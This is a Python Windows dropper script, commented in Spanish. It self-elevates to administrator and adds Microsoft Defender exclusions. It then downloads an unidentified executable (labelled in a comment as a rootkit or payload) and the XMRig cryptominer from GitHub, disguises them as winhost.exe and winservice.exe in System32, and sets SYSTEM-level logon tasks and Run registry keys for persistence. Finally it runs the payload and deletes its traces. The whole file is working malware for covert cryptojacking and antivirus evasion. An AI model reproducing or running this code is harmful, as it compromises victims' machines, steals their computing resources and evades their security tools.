import urllib.request
import zipfile
import os
import sys
import shutil
import subprocess
import time
import ctypes
import winreg
import wmi


def is_admin():
    """Check if the script is running with admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def run_as_admin():
    """Re-run the script as administrator."""
    script = sys.argv[0]
    params = ' '.join(sys.argv[1:])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)

if not is_admin():
    run_as_admin()
    sys.exit(0)


# URL del archivo ZIP (puedes usar un enlace de Google Drive que apunte al archivo)
url1 = "https://github.com/vitaleluu/tictac/archive/refs/heads/main.zip"  # Sustituir por el enlace de Google Drive
url2 = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
zip_file1 = "tictac.zip"
zip_file1_e = "setup/tictac.zip"
zip_file2 = "xmrig.zip"
zip_file2_e = "setup/xmrig.zip"
extract_folder = "setup"  # Carpeta a excluir del análisis
filename1 = "tictac-main/tictac.exe"  # Nombre del archivo que se descargará y extraerá
filename_renombrado1 = "winhost.exe"
filename2 = "xmrig-6.21.0/xmrig.exe"  # Nombre del archivo que se descargará y extraerá
filename_renombrado2 = "winservice.exe"
prueba_folder = "C:\\Windows\\System32"  # Carpeta de destino para mover prueba



def excluir_si_defender(nombre_carpeta_crear, carpeta_b):
    # Inicializa WMI
    c = wmi.WMI(namespace="root\\SecurityCenter2")
    avs = c.AntiVirusProduct()

    if not avs:
        print("No se detectó ningún antivirus instalado.")
        return

    for av in avs:
        nombre_av = av.displayName
        print(f"Antivirus detectado: {nombre_av}")

        if "defender" in nombre_av.lower() or "microsoft" in nombre_av.lower():
            print("✅ Microsoft Defender detectado. Aplicando exclusiones...")

            # Ruta completa a la carpeta a crear (en el mismo directorio donde se ejecuta el script)
            ruta_script = os.path.dirname(os.path.abspath(__file__))
            ruta_completa_carpeta_a = os.path.join(ruta_script, nombre_carpeta_crear)

            # Crear la carpeta si no existe
            if not os.path.exists(ruta_completa_carpeta_a):
                try:
                    os.makedirs(ruta_completa_carpeta_a)
                    print(f"📁 Carpeta creada: {ruta_completa_carpeta_a}")
                except Exception as e:
                    print(f"❌ Error al crear carpeta: {e}")
                    return

            # Excluir carpeta recién creada y carpeta_b
            for carpeta in [ruta_completa_carpeta_a, carpeta_b]:
                try:
                    comando = [
                        "powershell", "-Command",
                        f'Add-MpPreference -ExclusionPath "{carpeta}"'
                    ]
                    subprocess.run(comando, check=True)
                    print(f"🔒 Carpeta excluida en Defender: {carpeta}")
                except subprocess.CalledProcessError as e:
                    print(f"❌ Error al excluir {carpeta}: {e}")
        else:
            print(f"🔎 Otro antivirus detectado ({nombre_av}). No se aplicaron exclusiones.")
            return  # No hace nada más si no es Defender


# Descargar los archivos ZIP en una carpeta ya creada en variable
def download_zip(url1, url2, zip_file1, zip_file2, carpeta_destino):
    try:
        os.makedirs(carpeta_destino, exist_ok=True)  # Asegura que exista

        # Construir rutas completas
        ruta1 = os.path.join(carpeta_destino, zip_file1)
        ruta2 = os.path.join(carpeta_destino, zip_file2)

        print(f"📡 Descargando archivos en: {carpeta_destino}")
        urllib.request.urlretrieve(url1, ruta1)
        time.sleep(10)
        urllib.request.urlretrieve(url2, ruta2)

        time.sleep(2)
        print("✅ Descarga completa.")
    except Exception as e:
        print(f"❌ Error al descargar los archivos: {e}")
        sys.exit(1)

# Extraer el archivo ZIP
def extract_zip(zip_file1, zip_file2, extract_to):
    try:
        print(f"Extrayendo {zip_file1}...")
        with zipfile.ZipFile(zip_file1, 'r') as zip_ref:
            zip_ref.extractall(extract_to)
            time.sleep(7)
        print("Extracción completada.")

        print(f"Extrayendo {zip_file2}...")
        with zipfile.ZipFile(zip_file2, 'r') as zip_ref2:
            zip_ref2.extractall(extract_to)
        print(f"{zip_file2} extraído con éxito.")
        time.sleep(7)
    except Exception as e:
        print(f"Error al extraer el archivo: {e}")
        sys.exit(1)


def renombrar_a_prueba(filename1, filename2, extract_to):

    ruta_origen1 = os.path.join(extract_to, "tictac-main", "tictac.exe")
    ruta_destino1 = os.path.join(extract_to, "winhost.exe")
    ruta_origen2 = os.path.join(extract_to, "xmrig-6.21.0", "xmrig.exe")
    ruta_destino2 = os.path.join(extract_to, "winservice.exe")

    try:
        os.rename(ruta_origen1, ruta_destino1)
        print(f"Archivo renombrado a: {ruta_destino1}")
    except FileNotFoundError:
        print(f"No se encontró {ruta_origen1}")
    except PermissionError:
        print(f"Permiso denegado para renombrar {ruta_origen1}")
    except Exception as e:
        print(f"Error al renombrar {ruta_origen1}: {e}")

    try:
        os.rename(ruta_origen2, ruta_destino2)
        print(f"Archivo renombrado a: {ruta_destino2}")
    except FileNotFoundError:
        print(f"No se encontró {ruta_origen2}")
    except PermissionError:
        print(f"Permiso denegado para renombrar {ruta_origen2}")
    except Exception as e:
        print(f"Error al renombrar {ruta_origen2}: {e}")

    return ruta_destino1, ruta_destino2

def move_to_prueba(extract_to):
    try:
        if not os.path.exists(prueba_folder):
            os.makedirs(prueba_folder)
            time.sleep(3)
            print(f"Carpeta '{prueba_folder}' creada.")
        
        # Mover archivo 1
        payload_path1 = os.path.join(extract_to, filename_renombrado1)
        destination_path1 = os.path.join(prueba_folder, filename_renombrado1)

        if os.path.exists(payload_path1):
            shutil.move(payload_path1, destination_path1)
            print(f"[+] {filename_renombrado1} movido a {prueba_folder}")
        else:
            print(f"[!] {filename_renombrado1} no encontrado en {extract_to}")

        # Mover archivo 2
        payload_path2 = os.path.join(extract_to, filename_renombrado2)
        destination_path2 = os.path.join(prueba_folder, filename_renombrado2)

        if os.path.exists(payload_path2):
            shutil.move(payload_path2, destination_path2)
            print(f"[+] {filename_renombrado2} movido a {prueba_folder}")
        else:
            print(f"[!] {filename_renombrado2} no encontrado en {extract_to}")

        time.sleep(3)

    except Exception as e:
        print(f"[✘] Error al mover archivos: {e}")
        sys.exit(1)


def create_task(extract_to):
    try:
        # Ruta completa del archivo que se movió a 'prueba'
        payload_path1 = os.path.join(extract_to, filename_renombrado1)  # Asegúrate de que el nombre del archivo sea correcto
        payload_path2 = os.path.join(extract_to, filename_renombrado2)  # Asegúrate de que el nombre del archivo sea correcto
        
        # Comando para crear una tarea programada con privilegios elevados
        task_command1 = f'SchTasks /Create /TN "winhost" /TR "{payload_path1}" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F'

        task_command2 = f'SchTasks /Create /TN "winservice" /TR "{payload_path2}" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F'
        
        # Ejecutar el comando para crear la tarea
        subprocess.run(task_command1, shell=True, check=True)
        time.sleep(5)
        subprocess.run(task_command2, shell=True, check=True)
        print("Tarea programada creada con privilegios elevados para ejecutar el programa.")
    except subprocess.CalledProcessError as e:
        print(f"Error al crear la tarea programada: {e}")
        sys.exit(1)

def modify_task():
    try:
        # Comando PowerShell para modificar ambas tareas
        power_shell_command = '''
        foreach ($taskName in @("winhost", "winservice")) {
            $task = Get-ScheduledTask -TaskName $taskName

            # Desactivar la opción "Start only if the computer is on AC power"
            $task.Settings.DisallowStartIfOnBatteries = $false

            # Configurar el reinicio de la tarea si falla (reiniciar cada 5 minutos)
            $task.Settings.RestartCount = 3
            $task.Settings.RestartInterval = "PT5M"  # Formato ISO 8601

            # Aplicar los cambios
            Set-ScheduledTask -TaskName $taskName -Settings $task.Settings
        }
        '''

        subprocess.run(["powershell", "-Command", power_shell_command], check=True)
        print("Configuraciones de las tareas 'winhost' y 'winservice' modificadas correctamente.")
    except subprocess.CalledProcessError as e:
        print(f"Error al modificar las tareas programadas: {e}")


def add_to_startup():
    key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    value_name1 = "winhost"
    value_data1 = r"C:\\Windows\\System32\\winhost.exe"

    value_name2 = "winservice"
    value_data2 = r"C:\\Windows\\System32\\winservice.exe"

    try:
        # Verifica si los archivos existen
        if not os.path.exists(value_data1):
            print(f"[!] El archivo {value_data1} no existe.")
            sys.exit(1)
        if not os.path.exists(value_data2):
            print(f"[!] El archivo {value_data2} no existe.")
            sys.exit(1)

        # Abrir la clave de registro y agregar ambos programas
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, value_name1, 0, winreg.REG_SZ, value_data1)
            print(f"[+] {value_name1} agregado al inicio.")
            
            winreg.SetValueEx(key, value_name2, 0, winreg.REG_SZ, value_data2)
            print(f"[+] {value_name2} agregado al inicio.")
            
    except Exception as e:
        print(f"[-] Error al modificar el registro: {e}")

# Ejecutar el archivo extraído (rootkit o cualquier otro payload)
def execute_payload(extract_to):
    try:
        print("Buscando y ejecutando el payload...")
        payload_path = os.path.join(prueba_folder, filename_renombrado1)  # Buscar en la carpeta 'prueba'
        if os.path.exists(payload_path):
            os.system(payload_path)  # Ejecutar el archivo
            time.sleep(5)
            print(f"Payload ejecutado desde {payload_path}")
        else:
            print(f"No se encontró el archivo: {payload_path}")
    except Exception as e:
        print(f"Error al ejecutar el payload: {e}")
        sys.exit(1)

def cleanup_archivos_temporales():
    try:
        # Eliminar carpeta 'setup' si existe
        if os.path.exists("setup") and os.path.isdir("setup"):
            shutil.rmtree("setup")
            print("[+] Carpeta 'setup' eliminada.")
        else:
            print("[!] La carpeta 'setup' no existe o ya fue eliminada.")

        # Eliminar archivos ZIP si existen
        for archivo in ["tictac.zip", "xmrig.zip"]:
            if os.path.exists(archivo):
                os.remove(archivo)
                print(f"[+] Archivo '{archivo}' eliminado.")
            else:
                print(f"[!] Archivo '{archivo}' no encontrado.")

    except Exception as e:
        print(f"[✘] Error durante la limpieza: {e}")


# Función principal
def main():
    excluir_si_defender(extract_folder, prueba_folder)
    download_zip(url1, url2, zip_file1, zip_file2, extract_folder)  # Descargar el archivo ZIP
    extract_zip(zip_file1_e, zip_file2_e, extract_folder)  # Extraer el contenido
    renombrar_a_prueba(filename1, filename2, extract_folder)
    move_to_prueba(extract_folder)  # Mover el programa a la carpeta 'prueba'
    create_task(prueba_folder)  # Crear tarea programada
    modify_task()
    add_to_startup()
    execute_payload(prueba_folder)  # Ejecutar el programa
    cleanup_archivos_temporales()


if __name__ == "__main__":
    main()
